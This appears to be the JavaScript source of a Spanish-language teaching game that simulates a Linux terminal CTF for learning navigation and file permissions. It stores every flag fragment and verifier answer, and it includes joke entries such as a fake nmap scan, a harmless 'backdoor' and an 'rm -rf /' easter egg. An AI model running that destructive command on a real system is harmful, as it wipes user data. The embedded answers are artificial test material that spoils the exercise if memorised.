// Variables globales
let currentLevel = 1;
let currentPath = '/CTF_Challenge/Inicio';
let commandHistory = [];
let historyIndex = -1;
let terminal = document.getElementById('terminal');
let currentInputElement;
let copyNotification = document.getElementById('copy-notification');
let konami_sequence = [];
const KONAMI_CODE = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'KeyB', 'KeyA'];

// Sistema de archivos para Nivel 1 (CTF original) - CORREGIDO
const filesystem_level1 = {
    'CTF_Challenge': {
        type: 'directory',
        children: {
            'Inicio': {
                type: 'directory',
                children: {
                    'introduccion_ctf.txt': {
                        type: 'file',
                        content: `Bienvenido al reto CTF.
Tu objetivo será navegar por los directorios, explorar los archivos, y reunir las piezas necesarias para reconstruir la bandera final.
Utiliza los comandos de consola Linux como ls, cd, cat, mv, mkdir, rm.
¡Buena suerte!

P.S: Los hackers curiosos siempre encuentran secretos... 👀

💡 Nuevo: Usa 'level 2' para acceder al siguiente desafío de permisos.`
                    },
                    '.secret_readme.txt': {
                        type: 'file',
                        content: `¡Encontraste un archivo oculto!
Pista: Prueba el comando 'matrix' para ver algo genial.
También existe 'coffee' para los verdaderos programadores.
Los Konami Codes nunca pasan de moda... ↑↑↓↓←→←→BA`
                    }
                }
            },
            'Docs': {
                type: 'directory',
                children: {
                    'instrucciones.txt': {
                        type: 'file',
                        content: `Crea un directorio nuevo dentro de esta carpeta.
Mueve dentro de él los archivos correctos que contengan la bandera.
Cuando los hayas reunido, utiliza cat para concatenar su contenido y descubrir la flag final.`
                    },
                    'flag.txt': {
                        type: 'file',
                        content: 'CTF{HICISTE_'
                    },
                    'pista.txt': {
                        type: 'file',
                        content: `Pista: un organismo modelo usado en la ciencia.
Revisa con atención la carpeta Animales.`
                    },
                    'notas.txt': {
                        type: 'file',
                        content: `Estas son tus notas:
Ten cuidado, no todos los archivos contienen partes válidas de la bandera.
Algunos están puestos como trampa.

Nota del administrador: Si encuentras bugs, prueba 'debug' 🐛`
                    },
                    '.env': {
                        type: 'file',
                        content: `# Configuración del sistema CTF
VERSION="HackerOS 13.37-leet"
KERNEL="Penguin-5.4.0-42-generic"
SHELL="/bin/bash-4-nerds"
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
SECRET_SAUCE="The cake is a lie"`
                    }
                }
            },
            'Animales': {
                type: 'directory',
                children: {
                    'raton.txt': {
                        type: 'file',
                        content: 'LAS_MOVIDAS_'
                    },
                    'conejo.txt': {
                        type: 'file',
                        content: 'LOS_SALTOS_'
                    },
                    'murcielago.txt': {
                        type: 'file',
                        content: 'LOS_VUELOS_'
                    },
                    'zorro.txt': {
                        type: 'file',
                        content: 'LAS_TRAMPAS_'
                    },
                    'pista_frutas.txt': {
                        type: 'file',
                        content: 'Pista: La fruta correcta es la que empieza con "B" y es la favorita de los monos.'
                    },
                    '.dinosaur.txt': {
                        type: 'file',
                        content: `🦕 ¿Un dinosaurio? ¡Imposible!
Estos archivos tienen millones de años...
O tal vez solo están aquí desde 1970-01-01 00:00:00 UTC 😉`
                    }
                }
            },
            'Frutas': {
                type: 'directory',
                children: {
                    'bananas.txt': {
                        type: 'file',
                        content: 'BIEN}'
                    },
                    'kiwi.txt': {
                        type: 'file',
                        content: 'MAL}'
                    },
                    'manzana.txt': {
                        type: 'file',
                        content: 'BUENAS}'
                    },
                    'uva.txt': {
                        type: 'file',
                        content: 'CORRECTAS}'
                    }
                }
            },
            '.hidden': {
                type: 'directory',
                children: {
                    'secrets.txt': {
                        type: 'file',
                        content: `Easter Eggs disponibles:
- matrix: Efecto Matrix
- coffee: Para programadores
- sudo: Poder supremo (o no)
- rm -rf /: Classic troll
- sl: Tren choo-choo
- cowsay: Vaca parlanchina
- fortune: Galleta de la fortuna
- hack: Modo hacker
- debug: Información del sistema`
                    }
                }
            }
        }
    }
};

const filesystem_level2 = {
    'CTF_Permisos': {
        type: 'directory',
        children: {
            'Inicio': {
                type: 'directory',
                permissions: '755',
                owner: 'student',
                group: 'students',
                children: {
                    'mensaje_bienvenida.txt': {
                        type: 'file',
                        content: `Bienvenido, buscador del conocimiento prohibido.

Cinco pruebas te esperan, cada una guarda un fragmento del saber arcano:

1. La Puerta de Hierro - donde los sentidos duermen
2. El Tesoro del Rey - que no te pertenece  
3. El Pergamino Secreto - de hermandades antiguas
4. El Susurro Silencioso - que solo unos pocos escuchan
5. Las Runas Desordenadas - que esperan su flujo natural

Comienza donde la puerta de hierro te espera...`,
                        permissions: '644',
                        owner: 'student',
                        group: 'students'
                    }
                }
            },
            'Desafio_chmod': {
                type: 'directory',
                permissions: '755',
                owner: 'student',
                group: 'students',
                children: {
                    'enigma_puerta_cerrada.txt': {
                        type: 'file',
                        content: `La puerta de hierro permanece sellada.
No se ve, no se toca, no se habla.
Tres números mágicos pueden abrirla:
6 para el dueño, 4 para los aliados, 4 para los extraños.
¿Qué comando despierta a los sentidos dormidos?`,
                        permissions: '644',
                        owner: 'student',
                        group: 'students'
                    },
                    'puerta_hierro.txt': {
                        type: 'file',
                        content: `Si estas palabras lees, el primer fragmento mereces.
Ejecuta la llave verificadora para reclamar tu recompensa.`,
                        permissions: '000',
                        owner: 'student',
                        group: 'students'
                    },
                    'llave_verificadora.sh': {
                        type: 'file',
                        content: `#!/bin/bash
if [ -r "puerta_hierro.txt" ]; then
    echo "CTF{L0S_P3RM1" > ../fragmento_1.txt
    echo "✅ Fragmento 1 creado: fragmento_1.txt"
else
    echo "❌ Usa: chmod 644 puerta_hierro.txt"
fi`,
                        permissions: '755',
                        executable: true,
                        owner: 'student',
                        group: 'students'
                    }
                }
            },
            'Desafio_chown': {
                type: 'directory',
                permissions: '755',
                owner: 'student',
                group: 'students',
                children: {
                    'acertijo_propietario.txt': {
                        type: 'file',
                        content: `El tesoro del rey no te pertenece.
Su dueño es 'root', el soberano del sistema.
Toma posesión con el comando del cambio de corona.
El estudiante debe reclamar lo que es suyo.`,
                        permissions: '644',
                        owner: 'student',
                        group: 'students'
                    },
                    'tesoro_rey.txt': {
                        type: 'file',
                        content: `La corona ha cambiado de manos. 
El cetro de verificación confirmará tu derecho.`,
                        permissions: '600',
                        owner: 'root',
                        group: 'root'
                    },
                    'cetro_verificacion.sh': {
                        type: 'file',
                        content: `#!/bin/bash
echo "¿Cambiaste el propietario a 'student'? (y/n)"
read r
if [ "$r" = "y" ]; then
    echo "S05_S0N_L4_" > ../fragmento_2.txt
    echo "✅ Fragmento 2 creado: fragmento_2.txt"
else
    echo "❌ Usa: chown student tesoro_rey.txt"
fi`,
                        permissions: '755',
                        executable: true,
                        owner: 'student',
                        group: 'students'
                    },
                    '.root_secrets': {
                        type: 'file',
                        content: `🔐 Root's Secret Journal 🔐

Entry 1: "The best hackers know when to ask for help"
Entry 2: "chmod 777 is like leaving your front door open"
Entry 3: "umask is the silent guardian of security"
Entry 4: "With root comes great responsibility"

P.S: If you changed ownership successfully, you're worthy of these secrets.

Hidden flag fragment: {R00T_M4ST3R}`,
                        permissions: '600',
                        owner: 'root',
                        group: 'root'
                    }
                }
            },
            'Desafio_chgrp': {
                type: 'directory',
                permissions: '755',
                owner: 'student',
                group: 'students',
                children: {
                    'misterio_hermandad.txt': {
                        type: 'file',
                        content: `Este pergamino solo es legible para los 'guardias'.
Pero tú perteneces a la hermandad 'hackers'.
Cambia el círculo de lectores con el comando del grupo.
Solo los iniciados pueden descifrar su contenido.`,
                        permissions: '644',
                        owner: 'student',
                        group: 'students'
                    },
                    'pergamino_secreto.txt': {
                        type: 'file',
                        content: `La hermandad te acepta. 
El sello del verificador marcará tu progreso.`,
                        permissions: '640',
                        owner: 'root',
                        group: 'guardias'
                    },
                    'sello_verificador.sh': {
                        type: 'file',
                        content: `#!/bin/bash
echo "¿Cambiaste el grupo a 'hackers'? (y/n)"
read r
if [ "$r" = "y" ]; then
    echo "CL4V3_P4R4_" > ../fragmento_3.txt
    echo "✅ Fragmento 3 creado: fragmento_3.txt"
else
    echo "❌ Usa: chgrp hackers pergamino_secreto.txt"
fi`,
                        permissions: '755',
                        executable: true,
                        owner: 'student',
                        group: 'students'
                    }
                }
            },
            'Desafio_umask': {
                type: 'directory',
                permissions: '755',
                owner: 'student',
                group: 'students',
                children: {
                    'codigo_silencioso.txt': {
                        type: 'file',
                        content: `Crea un mensaje llamado 'susurro.txt' con el texto 'umask_correcto'
Pero primero... establece el silencio con umask 037.
Así solo tú y tu grupo podrán escuchar el susurro.
El oráculo verificará si el secreto está bien guardado.`,
                        permissions: '644',
                        owner: 'student',
                        group: 'students'
                    },
                    'oraculo_verificador.sh': {
                        type: 'file',
                        content: `#!/bin/bash
if [ -f "susurro.txt" ]; then
    perms=$(stat -c "%a" susurro.txt 2>/dev/null)
    if [ "$perms" = "640" ]; then
        echo "3L_T3S0R0" > ../fragmento_4.txt
        echo "✅ Fragmento 4 creado: fragmento_4.txt"
    else
        echo "❌ Permisos: $perms (deben ser 640)"
    fi
else
    echo "❌ Crea susurro.txt después de: umask 037"
fi`,
                        permissions: '755',
                        executable: true,
                        owner: 'student',
                        group: 'students'
                    },
                    '.umask_history': {
                        type: 'file',
                        content: `# Historial de máscaras umask

umask 022 - Default (rw-r--r-- para archivos)
umask 027 - Seguro (rw-r----- para archivos)
umask 077 - Paranoico (rw------- para archivos)
umask 000 - Peligroso (rw-rw-rw- para archivos)
umask 037 - El correcto para este desafío 😉

Fórmula: Permisos = 666 (archivos) o 777 (dirs) - umask

Ejemplo con umask 037:
666 - 037 = 640 (rw-r-----)`,
                        permissions: '644',
                        owner: 'student',
                        group: 'students'
                    }
                }
            },
            'Desafio_sort': {
                type: 'directory',
                permissions: '755',
                owner: 'student',
                group: 'students',
                children: {
                    'caos_ordenado.txt': {
                        type: 'file',
                        content: `Las runas antiguas han perdido su orden:

Restaura el flujo natural del conocimiento.
Guarda el resultado en 'runas_ordenadas.txt'
La piedra de la verdad revelará el fragmento final.`,
                        permissions: '644',
                        owner: 'student',
                        group: 'students'
                    },
                    'runas_desordenadas.txt': {
                        type: 'file',
                        content: `3-camino
1-El
4-secreto
2-desvela
5-final`,
                        permissions: '644',
                        owner: 'student',
                        group: 'students'
                    },
                    'piedra_verificadora.sh': {
                        type: 'file',
                        content: `#!/bin/bash
if [ -f "runas_ordenadas.txt" ]; then
    expected=$'1-El\\n2-desvela\\n3-camino\\n4-secreto\\n5-final'
    current=$(cat runas_ordenadas.txt)
    if [ "$current" = "$expected" ]; then
        echo "_D3_L0S_H4CK3R5}" > ../fragmento_5.txt
        echo "✅ Fragmento 5 creado: fragmento_5.txt"
    else
        echo "❌ Orden incorrecto"
    fi
else
    echo "❌ Usa: sort runas_desordenadas.txt > runas_ordenadas.txt"
fi`,
                        permissions: '755',
                        executable: true,
                        owner: 'student',
                        group: 'students'
                    }
                }
            },
            'Sala_Final': {
                type: 'directory',
                permissions: '755',
                owner: 'student',
                group: 'students',
                children: {
                    'profecia_completa.txt': {
                        type: 'file',
                        content: `Has reunido los 5 fragmentos del conocimiento arcano.

Para revelar la profecía completa:

cat ../fragmento_1.txt ../fragmento_2.txt ../fragmento_3.txt ../fragmento_4.txt ../fragmento_5.txt > flag_final.txt

Luego usa: more flag_final.txt`,
                        permissions: '644',
                        owner: 'student',
                        group: 'students'
                    },
                    '.easter_eggs.txt': {
                        type: 'file',
                        content: `🥚 Easter Eggs del Nivel 2:

- nmap: Escanea puertos y encuentra backdoors
- bsod: Pantalla azul de la muerte (simulada)
- backdoor: Investiga la puerta trasera
- whoami: ¿Quién eres realmente en nivel 2?
- matrix: El código nunca se va
- hack: Modo hacker intensificado

Archivos ocultos para explorar:
- .shadow_config en el directorio raíz
- .kernel_panic.log en algún lugar
- .root_secrets en Desafio_chown`,
                        permissions: '444',
                        owner: 'root',
                        group: 'root'
                    }
                }
            },
            '.hidden_vault': {
                type: 'directory',
                permissions: '750',
                owner: 'root',
                group: 'hackers',
                children: {
                    '.shadow_config': {
                        type: 'file',
                        content: `# Shadow Configuration File
# Access Level: RESTRICTED
# Last modified: 1970-01-01 00:00:00

[SYSTEM]
backdoor_port=31337
admin_password=hunter2
secret_key=CTF{Y0U_F0UND_TH3_SH4D0W}

[PERMISSIONS]
umask_override=000
chmod_bypass=enabled
chown_unrestricted=true

# If you're reading this, you've earned it 🎉`,
                        permissions: '600',
                        owner: 'root',
                        group: 'root'
                    },
                    '.kernel_panic.log': {
                        type: 'file',
                        content: `[    0.000000] Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)
[    0.000000] CPU: 0 PID: 1 Comm: swapper Not tainted 5.4.0-42-generic #13.37-leet
[    0.000000] Hardware name: CTF Virtual Machine/Hacker Edition
[    0.000000] Call Trace:
[    0.000000]  dump_stack+0x1337/0x0
[    0.000000]  panic+0x42/0x13
[    0.000000]  mount_block_root+0x0/0xdead
[    0.000000]  mount_root+0xbeef/0x0
[    0.000000]  
[    0.000000] Easter Egg Alert: System recovered by caffeine injection ☕
[    0.000000] Hidden wisdom: "With great perms comes great responsibility"`,
                        permissions: '444',
                        owner: 'root',
                        group: 'root'
                    },
                    'backdoor_access.sh': {
                        type: 'file',
                        content: `#!/bin/bash
# Backdoor Access Script
# Warning: For authorized hackers only

echo "🚪 Backdoor Access Granted"
echo "Connecting to secret channel..."
sleep 1
echo "Connection established!"
echo ""
echo "Secret message: Los permisos son la llave, el conocimiento es la puerta"
echo ""
echo "Achievement Unlocked: Master of Shadows"`,
                        permissions: '755',
                        executable: true,
                        owner: 'root',
                        group: 'hackers'
                    }
                }
            }
        }
    }
};

// Variable para el sistema de archivos actual
let filesystem = filesystem_level1;

// Estado de permisos simulados para nivel 2 - CORREGIDO
let permissionsState = {
    umask: '022',
    currentUser: 'student',
    currentGroup: 'students'
};

// Sistema de ayuda detallado con easter eggs
const commandHelp = {
    ls: {
        description: "Lista los archivos y directorios en el directorio actual",
        usage: "ls [directorio] [-a para archivos ocultos] [-l para formato largo]",
        examples: [
            "ls        # Lista el contenido del directorio actual",
            "ls Animales # Lista el contenido del directorio Animales",
            "ls -a     # Muestra archivos ocultos también",
            "ls -l     # Muestra permisos y propietarios (solo nivel 2)"
        ]
    },
    cd: {
        description: "Cambia el directorio actual",
        usage: "cd [directorio]",
        examples: [
            "cd Animales   # Cambia al directorio Animales",
            "cd ..         # Retrocede al directorio padre",
            "cd /          # Va al directorio raíz"
        ]
    },
    pwd: {
        description: "Muestra la ruta del directorio actual",
        usage: "pwd",
        examples: [
            "pwd   # Muestra algo como '/CTF_Challenge/Animales'"
        ]
    },
    cat: {
        description: "Muestra el contenido de uno o más archivos",
        usage: "cat archivo1 [archivo2 ...]",
        examples: [
            "cat flag.txt                   # Muestra el contenido de flag.txt",
            "cat flag.txt raton.txt         # Muestra ambos archivos concatenados",
            "cat flag.txt raton.txt > final.txt # Combina ambos archivos en final.txt"
        ]
    },
    chmod: {
        description: "Cambia los permisos de archivos y directorios (solo nivel 2)",
        usage: "chmod [permisos] archivo",
        examples: [
            "chmod 644 archivo.txt    # rw-r--r--",
            "chmod 755 directorio     # rwxr-xr-x",
            "chmod +x script.sh       # Agrega permisos de ejecución"
        ]
    },
    chown: {
        description: "Cambia el propietario de archivos (solo nivel 2)",
        usage: "chown usuario archivo",
        examples: [
            "chown student archivo.txt  # Cambia propietario a student"
        ]
    },
    chgrp: {
        description: "Cambia el grupo de archivos (solo nivel 2)",
        usage: "chgrp grupo archivo",
        examples: [
            "chgrp hackers archivo.txt  # Cambia grupo a hackers"
        ]
    },
    umask: {
        description: "Establece la máscara de permisos por defecto (solo nivel 2)",
        usage: "umask [valor]",
        examples: [
            "umask        # Muestra umask actual",
            "umask 037    # Establece umask a 037"
        ]
    },
    sort: {
        description: "Ordena las líneas de un archivo",
        usage: "sort archivo",
        examples: [
            "sort archivo_desordenado  # Ordena las líneas del archivo"
        ]
    },
    bash: {
        description: "Ejecuta un script de shell (solo nivel 2)",
        usage: "bash script.sh o ./script.sh",
        examples: [
            "bash verificador.sh  # Ejecuta el script verificador",
            "./verificador.sh     # Forma abreviada"
        ]
    },
    stat: {
        description: "Muestra información detallada de archivos (solo nivel 2)",
        usage: "stat [-c formato] archivo",
        examples: [
            "stat archivo.txt      # Información completa",
            "stat -c '%a' archivo  # Solo permisos en octal"
        ]
    },
    level: {
        description: "Cambia entre niveles del CTF",
        usage: "level [1|2]",
        examples: [
            "level 1   # Cambia al CTF de navegación",
            "level 2   # Cambia al CTF de permisos"
        ]
    },
    help: {
        description: "Muestra ayuda sobre los comandos disponibles",
        usage: "help [comando]",
        examples: [
            "help       # Muestra todos los comandos disponibles",
            "help cat   # Muestra ayuda detallada sobre el comando cat"
        ]
    }
};

// Función para obtener el sistema de archivos actual
function getCurrentFilesystem() {
    return filesystem;
}

// Función para cambiar de nivel
function changeLevel(newLevel) {
    if (newLevel === 1) {
        currentLevel = 1;
        filesystem = filesystem_level1;
        currentPath = '/CTF_Challenge/Inicio';
        return `🔄 Cambiado al Nivel 1: CTF de Navegación y Exploración
Objetivo: Encuentra y reúne las piezas de la bandera final.`;
    } else if (newLevel === 2) {
        currentLevel = 2;
        filesystem = filesystem_level2;
        currentPath = '/CTF_Permisos/Inicio';
        permissionsState = {
            umask: '022',
            currentUser: 'student',
            currentGroup: 'students'
        };
        return `🔄 Cambiado al Nivel 2: CTF de Permisos
Objetivo: Resuelve los 5 desafíos y reúne los fragmentos.
Nuevos comandos: chmod, chown, chgrp, umask, sort, bash, stat
Comienza en: cd Desafio_chmod`;
    } else {
        return `❌ Nivel inválido. Usa 'level 1' o 'level 2'.`;
    }
}

function checkPermissions(item, action = 'read') {
    if (currentLevel !== 2) return true;

    if (!item.permissions) return true;

    const perms = item.permissions;
    const owner = item.owner || permissionsState.currentUser;
    const group = item.group || permissionsState.currentGroup;

    // Determinar qué bits verificar según el usuario/grupo
    let permIndex;
    if (owner === permissionsState.currentUser) {
        permIndex = 0; // Owner bits (primer dígito)
    } else if (group === permissionsState.currentGroup) {
        permIndex = 1; // Group bits (segundo dígito)
    } else {
        permIndex = 2; // Others bits (tercer dígito)
    }

    const permBits = Number(perms[permIndex]);

    // Verificar permisos según la acción usando operadores bit a bit
    if (action === 'read' && (permBits & 4)) return true;     // Bit 4 = lectura
    if (action === 'write' && (permBits & 2)) return true;    // Bit 2 = escritura
    if (action === 'execute' && (permBits & 1)) return true;  // Bit 1 = ejecución

    return false;
}

// Función para formatear permisos en formato ls -l
function formatPermissions(item) {
    if (currentLevel !== 2 || !item.permissions) return '';

    const perms = item.permissions;
    let result = item.type === 'directory' ? 'd' : '-';

    // Owner permissions
    const owner = parseInt(perms[0]);
    result += (owner & 4) ? 'r' : '-';
    result += (owner & 2) ? 'w' : '-';
    result += (owner & 1) ? 'x' : '-';

    // Group permissions
    const group = parseInt(perms[1]);
    result += (group & 4) ? 'r' : '-';
    result += (group & 2) ? 'w' : '-';
    result += (group & 1) ? 'x' : '-';

    // Others permissions
    const others = parseInt(perms[2]);
    result += (others & 4) ? 'r' : '-';
    result += (others & 2) ? 'w' : '-';
    result += (others & 1) ? 'x' : '-';

    return result;
}

// Función para navegar al directorio
function getDirectoryAtPath(path) {
    const rootKey = currentLevel === 1 ? 'CTF_Challenge' : 'CTF_Permisos';
    const parts = path.replace(/^\/+/, '').split('/').filter(p => p);
    let current = getCurrentFilesystem();

    for (const part of parts) {
        if (current[part] && current[part].type === 'directory') {
            current = current[part].children;
        } else {
            return null;
        }
    }

    return current;
}

// Función para obtener el directorio padre de una ruta
function getParentDirectory(path) {
    const parts = path.replace(/^\/+/, '').split('/').filter(p => p);
    if (parts.length === 0) return null;

    parts.pop();
    return '/' + parts.join('/');
}

// Función para resolver rutas relativas
function resolvePath(targetPath) {
    if (targetPath.startsWith('/')) {
        return targetPath;
    }

    const currentParts = currentPath.replace(/^\/+/, '').split('/').filter(p => p);
    const targetParts = targetPath.split('/').filter(p => p);

    for (const part of targetParts) {
        if (part === '..') {
            if (currentParts.length > 0) {
                currentParts.pop();
            }
        } else if (part !== '.') {
            currentParts.push(part);
        }
    }

    return '/' + currentParts.join('/');
}

// Función para ejecutar lógica de scripts verificadores - CORREGIDA CON EXPLICACIONES
function executeScript(scriptName, content, currentDir) {
    let explanation = "";

    // Verificador de chmod - llave_verificadora.sh
    if (scriptName === 'llave_verificadora.sh' && currentPath.includes('Desafio_chmod')) {
        const puerta = currentDir['puerta_hierro.txt'];
        if (puerta && puerta.permissions === '644') {
            const parentPath = getParentDirectory(currentPath);
            const parentDir = getDirectoryAtPath(parentPath);
            if (parentDir) {
                parentDir['fragmento_1.txt'] = {
                    type: 'file',
                    content: 'CTF{L0S_P3RM1',
                    permissions: '644',
                    owner: permissionsState.currentUser,
                    group: permissionsState.currentGroup
                };
                explanation = "\n🔓 **Explicación:** Cambiaste los permisos de 'puerta_hierro.txt' de 000 (ningún acceso) a 644 (lectura/escritura para owner, solo lectura para grupo y otros). Esto permite leer el archivo y verificar que comprendes cómo funciona chmod.";
                return '✅ Fragmento 1 creado: fragmento_1.txt' + explanation;
            }
        } else {
            return '❌ Los permisos deben ser exactamente 644. Usa: chmod 644 puerta_hierro.txt';
        }
    }

    // Verificador de chown - cetro_verificacion.sh
    if (scriptName === 'cetro_verificacion.sh' && currentPath.includes('Desafio_chown')) {
        const tesoro = currentDir['tesoro_rey.txt'];
        if (tesoro && tesoro.owner === 'student') {
            const parentPath = getParentDirectory(currentPath);
            const parentDir = getDirectoryAtPath(parentPath);
            if (parentDir) {
                parentDir['fragmento_2.txt'] = {
                    type: 'file',
                    content: 'S05_S0N_L4_',
                    permissions: '644',
                    owner: permissionsState.currentUser,
                    group: permissionsState.currentGroup
                };
                explanation = "\n👑 **Explicación:** Cambiaste el propietario de 'tesoro_rey.txt' de 'root' a 'student'. Ahora tienes control total sobre el archivo como su nuevo dueño, demostrando que comprendes el comando chown.";
                return '✅ Fragmento 2 creado: fragmento_2.txt' + explanation;
            }
        } else {
            return '❌ Usa: chown student tesoro_rey.txt';
        }
    }

    // Verificador de chgrp - sello_verificador.sh
    if (scriptName === 'sello_verificador.sh' && currentPath.includes('Desafio_chgrp')) {
        const pergamino = currentDir['pergamino_secreto.txt'];
        if (pergamino && pergamino.group === 'hackers') {
            const parentPath = getParentDirectory(currentPath);
            const parentDir = getDirectoryAtPath(parentPath);
            if (parentDir) {
                parentDir['fragmento_3.txt'] = {
                    type: 'file',
                    content: 'CL4V3_P4R4_',
                    permissions: '644',
                    owner: permissionsState.currentUser,
                    group: permissionsState.currentGroup
                };
                explanation = "\n🔐 **Explicación:** Cambiaste el grupo de 'pergamino_secreto.txt' de 'guardias' a 'hackers'. Ahora perteneces al grupo con permisos de lectura, demostrando que comprendes el comando chgrp.";
                return '✅ Fragmento 3 creado: fragmento_3.txt' + explanation;
            }
        } else {
            return '❌ Usa: chgrp hackers pergamino_secreto.txt';
        }
    }

    // Verificador de umask - oraculo_verificador.sh
    if (scriptName === 'oraculo_verificador.sh' && currentPath.includes('Desafio_umask')) {
        const susurro = currentDir['susurro.txt'];
        if (susurro) {
            if (susurro.permissions === '640') {
                const parentPath = getParentDirectory(currentPath);
                const parentDir = getDirectoryAtPath(parentPath);
                if (parentDir) {
                    parentDir['fragmento_4.txt'] = {
                        type: 'file',
                        content: '3L_T3S0R0',
                        permissions: '644',
                        owner: permissionsState.currentUser,
                        group: permissionsState.currentGroup
                    };
                    explanation = "\n🔐 **Explicación:** Configuraste umask 037 antes de crear 'susurro.txt'. El umask 037 (que niega permisos de escritura para grupo y todos los permisos para otros) resultó en permisos 640 al crear el archivo, demostrando que comprendes cómo umask afecta los permisos por defecto.";
                    return '✅ Fragmento 4 creado: fragmento_4.txt' + explanation;
                }
            } else {
                return `❌ Permisos incorrectos: ${susurro.permissions} (deben ser 640). Recuerda: debes establecer 'umask 037' ANTES de crear el archivo con 'echo umask_correcto > susurro.txt'`;
            }
        } else {
            return '❌ Primero establece umask 037, luego crea susurro.txt con: echo umask_correcto > susurro.txt';
        }
    }

    // Verificador de sort - piedra_verificadora.sh
    if (scriptName === 'piedra_verificadora.sh' && currentPath.includes('Desafio_sort')) {
        const ordenado = currentDir['runas_ordenadas.txt'];
        if (ordenado) {
            const expected = '1-El\n2-desvela\n3-camino\n4-secreto\n5-final';
            if (ordenado.content.trim() === expected.trim()) {
                const parentPath = getParentDirectory(currentPath);
                const parentDir = getDirectoryAtPath(parentPath);
                if (parentDir) {
                    parentDir['fragmento_5.txt'] = {
                        type: 'file',
                        content: '_D3_L0S_H4CK3R5}',
                        permissions: '644',
                        owner: permissionsState.currentUser,
                        group: permissionsState.currentGroup
                    };
                    explanation = "\n📜 **Explicación:** Usaste el comando 'sort' para ordenar las líneas de 'runas_desordenadas.txt' numéricamente y redirigiste la salida a 'runas_ordenadas.txt'. Esto demuestra que comprendes cómo usar sort y redirección en la terminal.";
                    return '✅ Fragmento 5 creado: fragmento_5.txt' + explanation;
                }
            } else {
                return '❌ Orden incorrecto';
            }
        } else {
            return '❌ Usa: sort runas_desordenadas.txt > runas_ordenadas.txt';
        }
    }

    return 'Script ejecutado' + explanation;
}

// Easter eggs
const easterEggs = {
    matrix: function () {
        let output = '<span class="matrix">Wake up, Neo...\n';
        for (let i = 0; i < 5; i++) {
            output += '01001000 01100001 01100011 01101011 01100101 01110010\n';
        }
        output += 'The Matrix has you... 💊</span>';
        return output;
    },

    coffee: function () {
        return `<span class="easter-egg">
            ( (
             ) )
          ........
          |      |]
          \\      /
           \`----'

☕ Error 418: I'm a teapot
But I can still make coffee for hackers!</span>`;
    },

    sudo: function (args) {
        const phrases = [
            "We trust you have received the usual lecture from the local System Administrator.",
            "Nice try, but you're not root here!",
            "With great power comes great electricity bill.",
            "sudo: unable to resolve host 'reality'",
            "Access denied. Have you tried turning it off and on again?"
        ];
        return `<span class="easter-egg">${phrases[Math.floor(Math.random() * phrases.length)]}</span>`;
    },

    'rm -rf /': function () {
        return `<span class="error">💀 ABORT! ABORT! ABORT! 💀
Just kidding... but don't try this at home!
Your data is safe... for now. 😈</span>`;
    },

    sl: function () {
        return `<span class="easter-egg">
      ====        ________                ___________
  _D _|  |_______/        \\__I_I_____===__|_________|
   |(_)---  |   H\\________/ |   |        =|___ ___|
   /     |  |   H  |  C&O  |  |  |         ||_| |_||
  |      |  |   H  |__-------|  |   |         |__|___|
  | ________|___H__/__|_____/__|_____| 
  |_____/    |---L^L|===L^L===L^L===L

🚂 Choo-choo! You've been train-rolled!</span>`;
    },

    cowsay: function (args) {
        const message = args.length > 0 ? args.join(' ') : "Have you tried the Konami Code?";
        const border = '_'.repeat(message.length + 2);
        return `<span class="easter-egg">
 ${border}
< ${message} >
 ${'-'.repeat(message.length + 2)}
        \\   ^__^
         \\  (oo)\\_______
            (__)\\       )\\/\\
                ||----w |
                ||     ||</span>`;
    },

    fortune: function () {
        const fortunes = [
            "A bug in the code is worth two in the documentation.",
            "There are only 10 types of people: those who understand binary and those who don't.",
            "Programming is 10% science, 20% ingenuity, and 70% getting the ingenuity to work with the science.",
            "Always code as if the person who ends up maintaining your code is a violent psychopath who knows where you live.",
            "The best thing about a boolean is even if you are wrong, you are only off by a bit."
        ];
        return `<span class="success">🥠 ${fortunes[Math.floor(Math.random() * fortunes.length)]}</span>`;
    },

    hack: function () {
        return `<span class="matrix">
🎭 INITIATING HACK SEQUENCE...
[████████████████████████████] 100%
Access granted to mainframe...
Bypassing firewall...
Downloading the_internet.zip...
💻 HACK COMPLETE! You are now 1337 h4x0r!</span>`;
    },

    debug: function () {
        const now = new Date();
        return `<span class="help-command">🐛 System Debug Information:
OS: HackerOS 13.37-leet edition
Current Level: ${currentLevel}
Current Path: ${currentPath}
Filesystem: ${currentLevel === 1 ? 'CTF_Challenge' : 'CTF_Permisos'}
Time: ${now.toLocaleString()}
Permissions State: ${JSON.stringify(permissionsState)}
Load average: 0.42, 1.33, 7.77</span>`;
    },

    konami: function () {
        return `<span class="matrix">
🎮 KONAMI CODE ACTIVATED! 🎮
↑↑↓↓←→←→BA

⭐ You've unlocked the secret hacker achievement! ⭐
+30 Lives, +1337 Points, +∞ Coffee</span>`;
    },

    Peque: function () {
        return `<span class="easter-egg">CTF{HICISTE_LAS_MOVIDAS_BIEN}</span>`;
    },
    nmap: function () {
        return `<span class="success">
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00042s latency).

PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
443/tcp   open     https
1337/tcp  open     waste
3306/tcp  filtered mysql
8080/tcp  open     http-proxy
31337/tcp open     🚪 BACKDOOR DETECTED! 🚪

⚠️  ALERT: Suspicious backdoor found on port 31337
🔓 Type 'backdoor' to investigate further...

Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds</span>`;
    },

    backdoor: function () {
        return `<span class="matrix">
🚪 Accessing hidden backdoor...

[████████████████████████] 100%

🎭 BACKDOOR UNLOCKED!

You've discovered the secret passage...
Hidden message: "In the shadows of /etc, wisdom awaits"

Hint: Check .shadow_config in level 2 hidden directories
</span>`;
    },

    bsod: function () {
        // Crear overlay de BSOD
        const bsodDiv = document.createElement('div');
        bsodDiv.id = 'bsod-overlay';
        bsodDiv.innerHTML = `
            <div class="bsod-content">
                <h1>:(</h1>
                <p>Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.</p>
                <p class="error-code">0% complete</p>
                <div class="error-details">
                    <p>If you'd like to know more, you can search online later for this error: HACKER_OVERLOAD_EXCEPTION</p>
                </div>
